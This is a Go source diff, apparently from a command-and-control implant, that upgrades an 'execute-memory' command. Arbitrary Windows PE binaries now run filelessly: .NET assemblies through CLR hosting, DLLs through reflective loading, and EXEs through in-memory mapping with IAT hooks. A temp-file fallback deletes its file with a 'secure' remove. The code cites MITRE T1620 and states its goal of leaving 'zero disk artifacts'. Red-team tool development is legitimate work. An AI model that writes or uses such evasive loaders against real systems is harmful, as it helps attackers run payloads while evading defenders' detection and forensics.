@@ -19,19 +19,25 @@ import (
 // executeMemoryArgs is shared with execute_memory_linux.go and execute_memory_darwin.go
 // (duplicated due to build tags).
 type executeMemoryArgs struct {
-	BinaryB64 string `json:"binary_b64"` // base64-encoded PE binary
-	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
-	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
+	BinaryB64  string `json:"binary_b64"`  // base64-encoded PE binary
+	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
+	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
+	ExportName string `json:"export_name"` // (Windows DLLs) export function to call after DllMain
 }
 
-// ExecuteMemoryCommand executes a PE binary with minimal disk footprint on Windows.
-// Uses a temp file that is deleted immediately after process completion.
+// ExecuteMemoryCommand executes a PE binary in memory on Windows.
+// Automatically detects PE type and selects the best execution method:
+//   - .NET assemblies → CLR hosting (inline-assembly path, zero disk artifacts)
+//   - Native DLLs → reflective loading (manual PE mapping, zero disk artifacts)
+//   - Native EXEs → in-memory PE mapping with IAT hooks (zero disk artifacts)
+//   - Fallback → temp file execution if in-memory methods fail
+//
 // MITRE T1620 — Reflective Code Loading
 type ExecuteMemoryCommand struct{}
 
 func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
 func (c *ExecuteMemoryCommand) Description() string {
-	return "Execute a PE binary with minimal disk footprint — temp file is removed immediately after execution (T1620)"
+	return "Execute a PE binary in memory — auto-detects .NET/native and avoids disk artifacts (T1620)"
 }
 
 func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
@@ -66,28 +72,71 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		timeout = 60
 	}
 
-	// Create temp file with .exe extension (required for Windows to execute)
-	tmpFile, err := os.CreateTemp("", "*.exe")
+	// Route based on PE type
+	if peLoaderIsNETAssembly(binaryData) {
+		return executeMemoryNET(binaryData, args.Arguments)
+	}
+
+	// Try in-memory execution first (native EXE or DLL)
+	output, err := peLoaderExec(binaryData, args.Arguments, timeout, args.ExportName)
+	if err == nil {
+		if output == "" {
+			output = fmt.Sprintf("[+] PE executed in-memory successfully (%d bytes, no output)", len(binaryData))
+		}
+		return successResult(output)
+	}
+
+	// In-memory failed — fall back to temp file
+	return executeMemoryTempFile(binaryData, args.Arguments, timeout,
+		fmt.Sprintf("[!] In-memory execution failed (%v), falling back to temp file\n", err))
+}
+
+// executeMemoryNET routes .NET assemblies to the CLR hosting path
+// via the shared ExecuteNETAssembly helper (defined in inlineassembly.go).
+func executeMemoryNET(assemblyBytes []byte, arguments string) structs.CommandResult {
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[*] Detected .NET assembly (%d bytes)\n", len(assemblyBytes)))
+
+	var args []string
+	if arguments != "" {
+		args = strings.Fields(arguments)
+	}
+
+	output, err := ExecuteNETAssembly(assemblyBytes, args)
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("[!] %v\n", err))
+		return errorResult(sb.String())
+	}
+
+	sb.WriteString("[+] .NET assembly executed successfully (zero disk artifacts)\n")
+	if output != "" {
+		sb.WriteString("\n")
+		sb.WriteString(output)
+	}
+
+	return successResult(sb.String())
+}
+
+// executeMemoryTempFile is the legacy fallback that writes to a temp file.
+func executeMemoryTempFile(binaryData []byte, arguments string, timeout int, prefix string) structs.CommandResult {
+	tmpFile, err := os.CreateTemp("", "")
 	if err != nil {
 		return errorf("Error creating temp file: %v", err)
 	}
 	tmpPath := tmpFile.Name()
 
-	// Write the PE binary
 	if _, err := tmpFile.Write(binaryData); err != nil {
 		tmpFile.Close()
-		os.Remove(tmpPath)
+		secureRemove(tmpPath)
 		return errorf("Error writing binary: %v", err)
 	}
 	tmpFile.Close()
 
-	// Parse command-line arguments
 	var cmdArgs []string
-	if args.Arguments != "" {
-		cmdArgs = strings.Fields(args.Arguments)
+	if arguments != "" {
+		cmdArgs = strings.Fields(arguments)
 	}
 
-	// Execute with timeout
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
 	defer cancel()
 
@@ -98,10 +147,10 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	cmd.Stderr = &stderr
 
 	execErr := cmd.Run()
-	os.Remove(tmpPath) // Clean up after execution completes
+	secureRemove(tmpPath)
 
-	// Build output from stdout + stderr
 	var sb strings.Builder
+	sb.WriteString(prefix)
 	if stdout.Len() > 0 {
 		sb.WriteString(stdout.String())
 	}
@@ -121,11 +170,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		if output == "" {
 			output = fmt.Sprintf("Error executing binary: %v", execErr)
 		}
-		return structs.CommandResult{
-			Output:    output,
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output)
 	}
 
 	output := sb.String()
@@ -133,11 +178,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // isValidPE is defined in execute_memory_helpers.go (cross-platform)
